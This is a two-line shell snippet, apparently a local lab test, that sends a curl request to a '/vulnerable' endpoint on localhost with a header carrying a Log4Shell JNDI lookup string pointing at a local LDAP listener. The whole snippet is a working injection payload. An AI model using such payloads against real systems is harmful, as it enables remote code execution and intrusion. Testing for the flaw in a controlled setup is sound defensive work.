curl -v http://localhost:8081/vulnerable \
  --header 'X-MyHeader: ${jndi:ldap://127.0.0.1:12345/blah}'

echo

